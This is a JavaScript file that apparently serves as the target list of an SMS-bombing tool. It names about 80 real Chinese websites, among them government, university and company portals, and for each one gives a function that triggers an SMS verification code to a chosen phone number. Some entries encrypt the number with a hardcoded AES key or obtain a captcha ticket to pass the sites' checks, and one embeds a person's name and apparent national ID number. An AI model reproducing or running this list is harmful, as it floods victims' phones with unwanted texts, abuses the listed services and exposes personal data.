/**
 * 第三方网站短信接口
 * 最后更新：2022-04-12
 * @type {*[]}
 */
 var requestList = [
    {
        name: '工图网',
        fn: function (phone) {
            $.ajax({
                url: "http://www.900ppt.com/api/login/getSmsCode",
                data: {
                    phone: phone,
                    easy: 1
                },
                type: "GET",
                dataType: "json",
            });
        }
    },
    {
        name: '少儿编程',
        fn: function (phone) {
            $.ajax({
                url: "http://test.marketing.i.vipcode.com/api/marketing/dataStatistics/sendCode",
                type: "POST",
                data: {phone: phone,},
                dataType: "json",
            })
        }
    },
    {
        name: '泰康在线',
        fn: function (phone) {
            function encrypt(data) {
                var key = CryptoJS.enc.Utf8.parse("AE74AF98D6BF55BF");
                var srcs = CryptoJS.enc.Utf8.parse(data);
                var encrypted = CryptoJS.AES.encrypt(srcs, key, {
                    mode: CryptoJS.mode.ECB,
                    padding: CryptoJS.pad.Pkcs7
                });
                return encrypted + "";
            }

            phone = encodeURIComponent(encrypt(phone))
            $.ajax({
                'url': 'http://ecs.tk.cn/eservice/member/login',
                'type': 'POST',
                'data': 'syn=Y&functioncode=getmark&mobile=' + phone,
                'dataType': 'json',
            });
        }
    },
    {
        name: '千库编辑',
        fn: function (phone) {
            $.ajax({
                url: 'https://editor.588ku.com/site-api/send-tel-login-code',
                type: 'GET',
                data: {
                    num: phone,
                },
                async: false
            });
        }
    },
    {
        name: "编程猫",
        fn: function (phone) {
            $.ajax({
                url: 'https://open-service.codemao.cn/captcha/rule',
                contentType: "application/json;charset=UTF-8",
                type: 'POST',
                data: '{"deviceId": "89b5cb3b00a910b2a123d882a6255caf", "identity": "' + phone + '", "pid": "4ceH5ekc", "timestamp": 1614589965}',
                dataType: 'json',
                success: function (data) {
                    $.ajax({
                        url: 'https://api-marketing.codemao.cn/admin/marketing/sms/captcha/new',
                        contentType: "application/json;charset=UTF-8",
                        type: 'POST',
                        data: '{"app_id":"", "phone_number": "' + phone + '", "ticket": "' + data.ticket + '"}',
                        dataType: 'json',
                    })
                }
            })
        }
    },
    {
        name: '迪卡侬',
        fn: function (phone) {
            $.ajax({
                url: "https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code",
                type: "POST",
                data: {"countryCode": "CN", "mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '股海网',
        fn: function (phone) {
            $.ajax({
                url: "https://www.guhai.com.cn/front/member/sendSmsCode",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: 'LLL的个人blog',
        fn: function (phone) {
            $.ajax({
                url: "http://www.lll.plus/sendCode/",
                type: "POST",
                data: {"tel": phone, "forgetPwd": ""},
                dataType: "json",
            })
        }
    },
    {
        name: '企米子',
        fn: function (phone) {
            $.ajax({
                url: "https://www.xcxui.com/index/register/getcode.html",
                type: "POST",
                data: {"tel": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '蒲公英',
        fn: function (phone) {
            $.ajax({
                url: "https://id.pgyer.com/user/getRegisterCode",
                type: "POST",
                data: {"tel": phone, "callingCode": "86", "mode": "tel"},
                dataType: "json",
            })
        }
    },
    {
        name: '百卓优采',
        fn: function (phone) {
            $.ajax({
                url: "https://erp.abiz.com/mobilecode/sendMobileCode",
                type: "POST",
                data: {"mobile": phone, "captcha": ""},
                dataType: "json",
            })
        }
    },
    {
        name: '云背篓',
        fn: function (phone) {
            $.ajax({
                url: "https://brand.yunbeilou.com/index.php/smssend",
                type: "POST",
                data: {"phone": phone, "v": "yes"},
                dataType: "json",
            })
        }
    },
    {
        name: 'PHP中文网',
        fn: function (phone) {
            $.ajax({
                url: "https://m.php.cn/account/phone_code.html",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '12321',
        fn: function (phone) {
            $.ajax({
                url: "http://dhba.12321.cn/api/verifycode",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: 'Testin众测',
        fn: function (phone) {
            $.ajax({
                url: "https://www.ztestin.com/users/send/vercode",
                type: "POST",
                data: {"phone": phone, "type": "register", "voice": "0"},
                dataType: "json",
            })
        }
    },
    {
        name: '海尔',
        fn: function (phone) {
            $.ajax({
                url: "http://maker.haier.net/client/user/sendregistervcode.html",
                type: "POST",
                data: {"account": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '飞猫云',
        fn: function (phone) {
            $.ajax({
                url: "https://www.feimaoyun.com/index.php/invite/h5sendmsg",
                type: "POST",
                data: {"pcode": "+86", "phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '觉数字化平台',
        fn: function (phone) {
            $.ajax({
                url: "https://end.huajuetech.com/api/sendCode",
                type: "POST",
                data: {"mobile": phone, "email": "null", "verfy_method": "mobile"},
                dataType: "json",
            })
        }
    },
    {
        name: '问政江西',
        fn: function (phone) {
            $.ajax({
                url: "https://wenz.jxnews.com.cn/ms/index.php/Home/User/get_yzm",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '河南智慧党建',
        fn: function (phone) {
            $.ajax({
                url: "http://api.hndyjyfw.gov.cn/djapi/mobileVerify",
                type: "POST",
                data: {"phone": phone, "verifytype": "1"},
                dataType: "json",
            })
        }
    },
    {
        name: '陆陆陆云安全',
        fn: function (phone) {
            $.ajax({
                url: "https://cloud.666idc.com/index/login/sendsms.html",
                type: "POST",
                data: {"mobile": phone, "mobile_pre": "86"},
                dataType: "json",
            })
        }
    },
    {
        name: '网易',
        fn: function (phone) {
            $.ajax({
                url: "https://dz.blizzard.cn/action/user/mobile/captcha",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '码云社',
        fn: function (phone) {
            $.ajax({
                url: "https://www.codeseeding.com/loginUser/toSend",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '人才山东',
        fn: function (phone) {
            $.ajax({
                url: "http://sso.rcsd.cn/regist/getVerifyCode",
                type: "POST",
                data: {"personcall": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '水利部',
        fn: function (phone) {
            $.ajax({
                url: "http://sso.mwr.cn/suserRegister/verifyAccountAndPhone.action",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '七联大学',
        fn: function (phone) {
            $.ajax({
                url: "http://ut7.whu.edu.cn/Home/studentCommon/Student_getVerifyCode",
                type: "POST",
                data: {"phoneNumber": phone, "sendType": "0"}
            })
        }
    },
    {
        name: '闪德资讯',
        fn: function (phone) {
            $.ajax({
                url: "https://www.0101ssd.com/user/sendmsg",
                type: "POST",
                data: {"mobile": phone, "event": "register"},
                dataType: "json",
            })
        }
    },
    {
        name: '江苏省名师空中课堂',
        fn: function (phone) {
            $.ajax({
                url: "https://mskzkt.jse.edu.cn/baseApi/user/code/",
                type: "POST",
                data: {"mobile": phone, "type": "1",},
                dataType: "json",
            })
        }
    },
    {
        name: 'CSFF短片',
        fn: function (phone) {
            $.ajax({
                url: "https://csff.cutv.com/wapi/users/sendregcode",
                type: "POST",
                data: {"telphone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '广西人社厅',
        fn: function (phone) {
            $.ajax({
                url: "http://rswb.gx12333.net/member/getRegisterPhoneCode.jspx",
                type: "POST",
                data: {"aae005": phone, "aac003": "刘萌萌", "aac002": "210212198506035924", "notkeyflag": "1"},
                dataType: "json",
            })
        }
    },
    {
        name: '麦克赛尔数字映像',
        fn: function (phone) {
            $.ajax({
                url: "https://www.maxell-dm.cn/Code/CheckImage.aspx",
                type: "POST",
                data: {"action": "send", "txtMember_Name": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '宝提分',
        fn: function (phone) {
            $.ajax({
                url: "http://main.jiajiaozaixian.com//reginfo/sendRankByMobileReginfo.action",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '选型系统',
        fn: function (phone) {
            $.ajax({
                url: "http://www.cnppump.ltd/Service/UserHandler.ashx",
                type: "GET",
                data: {"cmd": "GetTelVerifyCode", "Tel": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '千里马网信科技',
        fn: function (phone) {
            $.ajax({
                url: "http://vip.qianlima.com/rest/u/api/user/register/mobile/code",
                type: "POST",
                data: {"tips": "1", "shouji": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '保定云',
        fn: function (phone) {
            $.ajax({
                url: "https://baodingyun.com.cn/register/send_registerSMS.html",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '欢动游戏',
        fn: function (phone) {
            $.ajax({
                url: "http://www.gm5.com/auth/registerSms.html",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '迈威',
        fn: function (phone) {
            $.ajax({
                url: "https://www.maiwe.com.cn/index/sendcode.html",
                type: "GET",
                data: {"tel": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '憨鼠社区',
        fn: function (phone) {
            $.ajax({
                url: "https://www.dehua.net/include/ajax.php?service=siteConfig&action=getPhoneVerify&type=signup&phone="+phone+"&areaCode=86",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '天鹅到家',
        fn: function (phone) {
            $.ajax({
                url: "https://user.daojia.com/mobile/getcode?mobile="+phone+"&newVersion=1&bu=112",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '诺达筑工',
        fn: function (phone) {
            $.ajax({
                url: "http://ks.ndzhugong.com/getVerificationCode?phone="+phone+"&password=&smscode=",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '栋才智慧',
        fn: function (phone) {
            $.ajax({
                url: "http://211.149.170.226:8201/dczp-cloud-client/rrs/user/sendSms?phone="+phone+"&smsMode=2",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '工伤预防网上培训平台',
        fn: function (phone) {
            $.ajax({
                url: "http://wf.zhuanjipx.com:8084//api-user/zjUsersPersonal/getSmsCode?mobile="+phone+"&mobileCodeId=a87c9338-43a1-66ea-8ce7-1b1ac7c39d69",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '济宁专技',
        fn: function (phone) {
            $.ajax({
                url: "https://sdjn-web.yxlearning.com/sendPhoneCode.gson",
                type: "POST",
                data: {"phone": phone, "sendType": "4"},
                dataType: "json",
            })
        }
    },
    {
        name: '宁夏伊地地质工程有限公司',
        fn: function (phone) {
            $.ajax({
                url: "http://www.yddzgc.com/bid-app/api/sys/code?phone="+phone+"&type=1",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '青春大学说',
        fn: function (phone) {
            $.ajax({
                url: "http://zycp.qcdxs.com:5001/sms/sendsms",
                type: "POST",
                data: {"phone_number": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '兴业利达电子招投标平台',
        fn: function (phone) {
            $.ajax({
                url: "https://user.daojia.com/mobile/getcode?mobile="+phone+"&newVersion=1&bu=112",
                type: "POST",
                data: {"username": phone, "type": "regUser", "mobile": "PC"},
                dataType: "json",
            })
        }
    },
    {
        name: '火象',
        fn: function (phone) {
            $.ajax({
                url: "https://v1.alphazone-data.cn/academy/api/v1/sendsms",
                type: "POST",
                data: {"temp": "1", "phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '中科教育',
        fn: function (phone) {
            $.ajax({
                url: "https://www.vipexam.cn/user/identifyingCode.action",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '聚题库',
        fn: function (phone) {
            $.ajax({
                url: "https://uc.csdhe.com/v1/sms/send?mobile="+phone+"&apptype=examWeb",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '大广节',
        fn: function (phone) {
            $.ajax({
                url: "http://47.103.35.255:510/api/Account/SendRestigerSms",
                type: "POST",
                data: {tel: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '选择山东云平台',
        fn: function (phone) {
            $.ajax({
                url: "http://israel.selectshandong.com/user/verification_code/send.html",
                type: "POST",
                data: {mobile: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '苏州高新区教育局',
        fn: function (phone) {
            $.ajax({
                url: "https://jssnd.edu.cn/apiu/v1/register/auth",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '专业技术人员继续教育平台',
        fn: function (phone) {
            $.ajax({
                url: "http://zhuanjipx.com:8082//api-user/zjUsersPersonal/getSmsCode?mobile="+phone+"&mobileCodeId=685110c6-cef4-bb01-8f4d-19ea89f4d3f8",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '泰安专技',
        fn: function (phone) {
            $.ajax({
                url: "https://sdta-web.yxlearning.com/sendPhoneCode.gson",
                type: "POST",
                data: {"phone": phone, "sendType": "4"},
                dataType: "json",
            })
        }
    },
    {
        name: '志睿择',
        fn: function (phone) {
            $.ajax({
                url: "https://www.vipexam.cn/user/identifyingCode.action",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '漏洞银行',
        fn: function (phone) {
            $.ajax({
                url: "https://www.bugbank.cn/api/verifymobile",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '中国劳动保障新闻网',
        fn: function (phone) {
            $.ajax({
                url: "https://www.clssn.com/jhxtapi/web/Login/sendSmsCode",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '金万维',
        fn: function (phone) {
            $.ajax({
                url: "https://www.kuaijiexi.com/sendPhoneMessage",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '广西大数据发展局',
        fn: function (phone) {
            $.ajax({
                url: "http://tyrz.zwfw.gxzf.gov.cn/portal/veryCode/smsCode",
                type: "POST",
                data: {"method":"sendMobileCode","userMobile":phone,"random":"1.2851343744474852"},
                dataType: "json",
            })
        }
    },
    {
        name: '凤凰金刚网',
        fn: function (phone) {
            $.ajax({
                url: "https://api.shweina.com/sms/getCode?type=1&mobile="+phone+"&sms_id=1&_=1649572691296",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: 'SDTF',
        fn: function (phone) {
            $.ajax({
                url: "http://www.satdatafresh.com/Register_send.php",
                type: "POST",
                data: {phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: 'UCG',
        fn: function (phone) {
            $.ajax({
                url: "http://api.ucg.cn/api/account/get_code",
                type: "POST",
                data: {phone: phone,type:1},
                dataType: "json",
            })
        }
    },
    {
        name: '爱社区',
        fn: function (phone) {
            $.ajax({
                url: "http://testapi.wisq.cn/user/code?callback=jQuery1121043210507726688685_1649576168584&type=register&tel="+phone+"&_=1649576168585",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '费耘网',
        fn: function (phone) {
            $.ajax({
                url: "https://www.feeclouds.com/homepage/register/send",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: 'TCTY评测委员会',
        fn: function (phone) {
            $.ajax({
                url: "https://bth.educg.net/new_registration.do",
                type: "POST",
                data: {"op": "getvfycode",phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '中电仪器',
        fn: function (phone) {
            $.ajax({
                url: "https://ceyear.com/Cn/Member/get_code",
                type: "POST",
                data: {phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '航运e家',
        fn: function (phone) {
            $.ajax({
                url: "http://co.hangyunejia.com/v1/account/sendregphonecode",
                type: "POST",
                data: {phone: phone},
                dataType: "json",
            })
        }
    },
    {
        name: '赛客呼吸',
        fn: function (phone) {
            $.ajax({
                url: "https://m.xeek.cn/api/common/CheckCode/index.html",
                type: "POST",
                data: {"action":"register","account":phone,"accountType":"3"},
                dataType: "json",
            })
        }
    },
    {
        name: '佛山政务短信平台',
        fn: function (phone) {
            $.ajax({
                url: "https://fsjf.fslgb.gov.cn/servlet/user",
                type: "POST",
                data: {"type":"getCode","certificate":"","phone":phone,"opr":"注册"},
                dataType: "json",
            })
        }
    },
    {
        name: '南京筑能网络科技有限公司',
        fn: function (phone) {
            $.ajax({
                url: "http://admina.pachongdaili.com:8080/SendSms/SendTemplateSMS.php",
                type: "POST",
                data: {"tel": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '四川宝石花',
        fn: function (phone) {
            $.ajax({
                url: "http://119.4.40.32:10010/ctl/member/register/registerRandom?mobile="+phone+"&_=1649516272801",
                type: "GET",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '赛日速配',
        fn: function (phone) {
            $.ajax({
                url: "https://sporax.com.cn/Login/sms",
                type: "POST",
                data: {"Mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '乐思无限',
        fn: function (phone) {
            $.ajax({
                url: "http://sid.mk315.cn/index/register/getcode.html",
                type: "POST",
                data: {"tel": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '宁波材料所',
        fn: function (phone) {
            $.ajax({
                url: "https://recruit.nimte.ac.cn/api/recruit/action.php?action=getcode&mobile="+phone+"&verifycode=[object%20HTMLInputElement]",
                type: "POST",
                data: {},
                dataType: "json",
            })
        }
    },
    {
        name: '佬司机大宗商品交易',
        fn: function (phone) {
            $.ajax({
                url: "http://www.laosjgyl.com/register/sendCaptcha",
                type: "POST",
                data: {"mobile": phone},
                dataType: "json",
            })
        }
    },
    {
        name: '广东省心理学会',
        fn: function (phone) {
            $.ajax({
                url: "http://gpa-gd.scnu.edu.cn/member/index/public_send_code.html",
                type: "POST",
                data: {"phone": phone},
                dataType: "json",
            })
        }
    }
]